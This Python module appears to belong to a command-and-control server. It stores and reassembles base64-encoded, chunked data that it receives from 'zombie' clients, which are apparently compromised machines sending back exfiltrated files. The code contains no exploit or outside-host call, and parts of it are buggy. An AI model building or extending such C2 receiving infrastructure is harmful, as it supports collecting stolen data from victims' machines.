from os import makedirs, path, remove, rename
import secrets
from base64 import b64decode
import logging
from datetime import datetime

"""
- Define way to interact with files on disk

"""
logger = logging.getLogger("ioFiles")
logging.basicConfig(level=logging.DEBUG, handlers=[
                        logging.FileHandler(f"c2_dev-{datetime.now().strftime('%Y%m%d_%H%S')}.log"),
                        logging.StreamHandler()
                    ], format="%(asctime)s |%(levelname)s| %(name)s->%(funcName)s => %(message)s    "
                    )

#print(f"[???] in server/ioFiles.py, name is: {__name__}")

"""
REMOVE _build_dirs, expensive checks just to write files


"""


class ioFiles:
    zombieID = ""
    pre = ""
    post = ""
    
    def __init__(self,zombieID:str):
        self.zombieID = zombieID
        self.pre = f"files/pre/{zombieID}"
        self.post = f"files/post/{zombieID}"
        self._build_dirs()
        return

    def _build_dirs(self,path:str):
        try:
            paths = [f"{path}/files/pre/",f"{path}/files/post/",f"{path}/files/stale"]
            for x in paths:
                print(f"IS_DIRECTORY => x: {x}")
                res = path.exists(x)
                if res == True:
                    print(f"IS_DIRECTORY => Found: {x}")
                    continue
                else:
                    print(f"IS_DIRECTORY => Didn't Find: {x}")
                    try:
                        res = makedirs(x)
                        print(f"IS_DIRECTORY => Made directory: {x}")
                        # if res == True:
                        #     continue
                        # else:
                        #     print(f"IS_DIRECTORY => ERROR MAKING DIR: {x}")
                        #     return False
                    except:
                        print(f"IS_DIRECTORY => EXCEPTION OCCURED WHILE MAKING DIR: {x}")
                        return False
            return True
        except:
            print("IS_DIRECTORY => ERROR, COULDN'T OPEN FS")
            return False
        
    
    def write_chunk(self,data):
        # if(self.is_directory()):
        print(f"WRITE_CHUNK => data is type: {type(data)}")
        try:
            # path = f"./files/pre/{zombieID}"
            print(f"WRITE_CHUNK => NOW OPENING: {self.pre}")
            try:
                with open(self.pre,'a') as f:
                    res = f.write(data)
                    print(f"WRITE_CHUNK => saved {res} bytes")
                    f.close()
                    return True
            except FileNotFoundError as e:
                print("WRITE_CHUNK => UNABLE TO WRITE, TRYING ALT....")
                with open(self.pre,"w") as f:
                    res = f.write(data)
                    print(f"WRITE_CHUNK => saved {res} bytes")
                    f.close()
                    return True  
        except:
            print(f"WRITE_CHUNK => E1: UNABLE TO WRITE CHUNK: {data}")
            return False
        # else:
        #     print(f"WRITE_CHUNK => E2: UNABLE TO WRITE CHUNK: {data}")
        #     return False
    
    """
    - take the file that was just finished being recived, move it to post directory, and finally remove the original pre file.
        - should be able to do something with split and 'CHUNK:'
    """
    def process_file(self,zombieID:str):
        # pre = f"./files/pre/{zombieID}"
        # post = f"./files/post/{zombieID}"
        token = secrets.token_urlsafe(6)
        postfile = f"{self.post}-{token}"
        with open(self.pre,"r") as f:
            pre_file = f.read()
            f.close()
        #prefile should now contain all chunks recieved from client
            # - need to split and decode each chunk before writting
        #print(f"PROCESS_FILE => preprocessed data found: {pre_file}")
        chunks = pre_file.split("CHUNK:")
        print(f"PROCESS_FILE => FOUND CHUNKS: {len(chunks)}")
        data = "" 
        print(f"PROCESS_FILE => DECODED DATA, WRITTING")
        try:
            for chunk in chunks:
                #print(f"PROCESS_FILE => in for loop, chunk len: {len(chunk)}")
                enc = b64decode(chunk)
                data += enc.decode('utf-8')
            with open(postfile,"a") as f:
                f.write(data)
                f.close()
        except:
            print(f"PROCESS_FILE => ERROR, COUDLN'T DECODE")
            print(f"PROCESS_FILE => SAVING RAW CHUNKS.....")
            with open(postfile,"w") as f:
                f.write(pre_file)
                f.close()     
        #print(f"PROCESS_FILE => now saving pre_file data to {postfile}")
        try:
            try:
                print(f"PROCESS_FILE => now removing {self.pre}")
                remove(self.pre)
                return token
            except:
                print(f"PROCESS_FILES => ERROR: COULDN'T REMOVE {self.pre}")
                print("PROCESS_FILES => BACKING UP AND DELETING")
                files = './files'
                #Rename files directory and move out of way to be recreated by server
                rename(files,f"./files-{token}")
                remove(self.pre)
                return None
        except:
            print(f"PROCESS_FILES => ERROR: UNABLE TO FAIL SAFELY")
            return None
        
    
